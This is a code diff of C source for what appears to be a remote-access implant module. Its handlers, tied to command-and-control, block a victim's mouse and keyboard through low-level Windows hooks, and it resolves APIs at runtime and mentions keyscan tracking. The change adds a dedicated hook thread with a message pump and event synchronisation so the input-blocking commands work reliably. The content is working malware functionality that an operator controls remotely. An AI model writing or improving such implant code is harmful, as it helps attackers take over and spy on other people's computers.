@@ -72,6 +72,7 @@ typedef LRESULT (WINAPI *fn_CallNextHookEx)(HHOOK, int, WPARAM, LPARAM);
 typedef BOOL    (WINAPI *fn_GetKeyboardState)(PBYTE);
 typedef int     (WINAPI *fn_ToUnicode)(UINT, UINT, const BYTE *, LPWSTR, int, UINT);
 typedef BOOL    (WINAPI *fn_GetMessageA)(LPMSG, HWND, UINT, UINT);
+typedef BOOL    (WINAPI *fn_PeekMessageA)(LPMSG, HWND, UINT, UINT, UINT);
 typedef BOOL    (WINAPI *fn_TranslateMessage)(const MSG *);
 typedef LRESULT (WINAPI *fn_DispatchMessageA)(const MSG *);
 typedef BOOL    (WINAPI *fn_PostThreadMessageA)(DWORD, UINT, WPARAM, LPARAM);
@@ -95,6 +96,8 @@ typedef DWORD   (WINAPI *fn_WaitForSingleObject)(HANDLE, DWORD);
 typedef BOOL    (WINAPI *fn_CloseHandle)(HANDLE);
 typedef void    (WINAPI *fn_Sleep)(DWORD);
 typedef DWORD   (WINAPI *fn_GetLastError)(void);
+typedef HANDLE  (WINAPI *fn_CreateEventA)(LPSECURITY_ATTRIBUTES, BOOL, BOOL, LPCSTR);
+typedef BOOL    (WINAPI *fn_SetEvent)(HANDLE);
 
 
 /* user32.dll — keyscan window tracking */
@@ -135,6 +138,7 @@ static struct
     fn_GetKeyboardState        pGetKeyboardState;
     fn_ToUnicode               pToUnicode;
     fn_GetMessageA             pGetMessageA;
+    fn_PeekMessageA            pPeekMessageA;
     fn_TranslateMessage        pTranslateMessage;
     fn_DispatchMessageA        pDispatchMessageA;
     fn_PostThreadMessageA      pPostThreadMessageA;
@@ -157,6 +161,8 @@ static struct
     fn_CloseHandle               pCloseHandle;
     fn_Sleep                     pSleep;
     fn_GetLastError              pGetLastError;
+    fn_CreateEventA              pCreateEventA;
+    fn_SetEvent                  pSetEvent;
 
 
     /* user32.dll — keyscan window tracking */
@@ -386,10 +392,27 @@ static int ui_pipe_destroy(pipe_t *pipe, c2_t *c2)
 
 /* ================================================================== */
 /* Handler 2-3: uictl_set / uictl_get (from uictl.c)                  */
+/*                                                                     */
+/* WH_MOUSE_LL / WH_KEYBOARD_LL hooks require the installing thread   */
+/* to run a message pump.  All hook operations are dispatched to a     */
+/* dedicated uictl thread via PostThreadMessageA.  An auto-reset      */
+/* event synchronises the caller so uictl_set can return success/fail. */
 /* ================================================================== */
 
-static HHOOK hMouseHook = NULL;
-static HHOOK hKeyboardHook = NULL;
+static HHOOK  hMouseHook    = NULL;
+static HHOOK  hKeyboardHook = NULL;
+
+/* Hook thread state */
+static HANDLE uictl_thread       = NULL;
+static DWORD  uictl_thread_id    = 0;
+static HANDLE uictl_done_event   = NULL;
+static volatile int uictl_result = 0;
+
+/* Custom thread messages */
+#define WM_UICTL_DISABLE_MOUSE    (WM_USER + 200)
+#define WM_UICTL_ENABLE_MOUSE     (WM_USER + 201)
+#define WM_UICTL_DISABLE_KEYBOARD (WM_USER + 202)
+#define WM_UICTL_ENABLE_KEYBOARD  (WM_USER + 203)
 
 static LRESULT CALLBACK uictl_mouse_hook(int nCode, WPARAM wParam, LPARAM lParam)
 {
@@ -411,62 +434,147 @@ static LRESULT CALLBACK uictl_keyboard_hook(int nCode, WPARAM wParam, LPARAM lPa
     return w.pCallNextHookEx(hKeyboardHook, nCode, wParam, lParam);
 }
 
-static int uictl_disable_mouse(void)
+/* These are only called on the uictl hook thread */
+
+static int uictl_disable_mouse_impl(void)
 {
     if (hMouseHook != NULL)
-    {
         return 0;
-    }
 
     hMouseHook = w.pSetWindowsHookExA(WH_MOUSE_LL, uictl_mouse_hook,
                                       cot_hModule, 0);
-
     return (hMouseHook != NULL) ? 0 : -1;
 }
 
-static int uictl_enable_mouse(void)
+static int uictl_enable_mouse_impl(void)
 {
     if (hMouseHook == NULL)
-    {
         return 0;
-    }
 
     if (w.pUnhookWindowsHookEx(hMouseHook))
     {
         hMouseHook = NULL;
         return 0;
     }
-
     return -1;
 }
 
-static int uictl_disable_keyboard(void)
+static int uictl_disable_keyboard_impl(void)
 {
     if (hKeyboardHook != NULL)
-    {
         return 0;
-    }
 
     hKeyboardHook = w.pSetWindowsHookExA(WH_KEYBOARD_LL, uictl_keyboard_hook,
                                          cot_hModule, 0);
-
     return (hKeyboardHook != NULL) ? 0 : -1;
 }
 
-static int uictl_enable_keyboard(void)
+static int uictl_enable_keyboard_impl(void)
 {
     if (hKeyboardHook == NULL)
-    {
         return 0;
-    }
 
     if (w.pUnhookWindowsHookEx(hKeyboardHook))
     {
         hKeyboardHook = NULL;
         return 0;
     }
-
     return -1;
+}
+
+static DWORD WINAPI uictl_thread_proc(LPVOID param)
+{
+    MSG msg;
+
+    (void)param;
+
+    /* Force message queue creation before signalling readiness */
+    w.pPeekMessageA(&msg, NULL, 0, 0, PM_NOREMOVE);
+
+    /* Signal caller that the thread is ready to receive messages */
+    w.pSetEvent(uictl_done_event);
+
+    while (w.pGetMessageA(&msg, NULL, 0, 0) > 0)
+    {
+        switch (msg.message)
+        {
+            case WM_UICTL_DISABLE_MOUSE:
+                uictl_result = uictl_disable_mouse_impl();
+                w.pSetEvent(uictl_done_event);
+                break;
+
+            case WM_UICTL_ENABLE_MOUSE:
+                uictl_result = uictl_enable_mouse_impl();
+                w.pSetEvent(uictl_done_event);
+                break;
+
+            case WM_UICTL_DISABLE_KEYBOARD:
+                uictl_result = uictl_disable_keyboard_impl();
+                w.pSetEvent(uictl_done_event);
+                break;
+
+            case WM_UICTL_ENABLE_KEYBOARD:
+                uictl_result = uictl_enable_keyboard_impl();
+                w.pSetEvent(uictl_done_event);
+                break;
+
+            default:
+                w.pTranslateMessage(&msg);
+                w.pDispatchMessageA(&msg);
+                break;
+        }
+    }
+
+    /* Clean up hooks before exiting */
+    if (hMouseHook)
+    {
+        w.pUnhookWindowsHookEx(hMouseHook);
+        hMouseHook = NULL;
+    }
+
+    if (hKeyboardHook)
+    {
+        w.pUnhookWindowsHookEx(hKeyboardHook);
+        hKeyboardHook = NULL;
+    }
+
+    return 0;
+}
+
+static int uictl_ensure_thread(void)
+{
+    if (uictl_thread != NULL)
+        return 0;
+
+    /* Auto-reset event: resets after each successful Wait */
+    uictl_done_event = w.pCreateEventA(NULL, FALSE, FALSE, NULL);
+    if (uictl_done_event == NULL)
+        return -1;
+
+    uictl_thread = w.pCreateThread(NULL, 0, uictl_thread_proc,
+                                   NULL, 0, &uictl_thread_id);
+    if (uictl_thread == NULL)
+    {
+        w.pCloseHandle(uictl_done_event);
+        uictl_done_event = NULL;
+        return -1;
+    }
+
+    /* Wait for the thread's message queue to be ready */
+    w.pWaitForSingleObject(uictl_done_event, 2000);
+    return 0;
+}
+
+/* Post a command to the hook thread and wait for the result */
+static int uictl_post_and_wait(UINT msg)
+{
+    if (uictl_ensure_thread() != 0)
+        return -1;
+
+    uictl_result = -1;
+    w.pPostThreadMessageA(uictl_thread_id, msg, 0, 0);
+    w.pWaitForSingleObject(uictl_done_event, 5000);
+    return uictl_result;
 }
 
 static tlv_pkt_t *uictl_set(c2_t *c2)
@@ -486,18 +594,22 @@ static tlv_pkt_t *uictl_set(c2_t *c2)
     switch (device)
     {
         case UICTL_MOUSE:
-            result = enable ? uictl_enable_mouse() : uictl_disable_mouse();
+            result = uictl_post_and_wait(enable ? WM_UICTL_ENABLE_MOUSE
+                                                : WM_UICTL_DISABLE_MOUSE);
             break;
 
         case UICTL_KEYBOARD:
-            result = enable ? uictl_enable_keyboard() : uictl_disable_keyboard();
+            result = uictl_post_and_wait(enable ? WM_UICTL_ENABLE_KEYBOARD
+                                                : WM_UICTL_DISABLE_KEYBOARD);
             break;
 
         case UICTL_ALL:
-            result = enable ? uictl_enable_mouse() : uictl_disable_mouse();
+            result = uictl_post_and_wait(enable ? WM_UICTL_ENABLE_MOUSE
+                                                : WM_UICTL_DISABLE_MOUSE);
             if (result == 0)
             {
-                result = enable ? uictl_enable_keyboard() : uictl_disable_keyboard();
+                result = uictl_post_and_wait(enable ? WM_UICTL_ENABLE_KEYBOARD
+                                                    : WM_UICTL_DISABLE_KEYBOARD);
             }
             break;
 
@@ -985,6 +1097,7 @@ COT_ENTRY
     w.pGetKeyboardState       = (fn_GetKeyboardState)cot_resolve("user32.dll", "GetKeyboardState");
     w.pToUnicode              = (fn_ToUnicode)cot_resolve("user32.dll", "ToUnicode");
     w.pGetMessageA            = (fn_GetMessageA)cot_resolve("user32.dll", "GetMessageA");
+    w.pPeekMessageA           = (fn_PeekMessageA)cot_resolve("user32.dll", "PeekMessageA");
     w.pTranslateMessage       = (fn_TranslateMessage)cot_resolve("user32.dll", "TranslateMessage");
     w.pDispatchMessageA       = (fn_DispatchMessageA)cot_resolve("user32.dll", "DispatchMessageA");
     w.pPostThreadMessageA     = (fn_PostThreadMessageA)cot_resolve("user32.dll", "PostThreadMessageA");
@@ -1007,6 +1120,8 @@ COT_ENTRY
     w.pCloseHandle               = (fn_CloseHandle)cot_resolve("kernel32.dll", "CloseHandle");
     w.pSleep                     = (fn_Sleep)cot_resolve("kernel32.dll", "Sleep");
     w.pGetLastError              = (fn_GetLastError)cot_resolve("kernel32.dll", "GetLastError");
+    w.pCreateEventA              = (fn_CreateEventA)cot_resolve("kernel32.dll", "CreateEventA");
+    w.pSetEvent                  = (fn_SetEvent)cot_resolve("kernel32.dll", "SetEvent");
 
 
     /* ---- user32.dll — keyscan window tracking ---- */
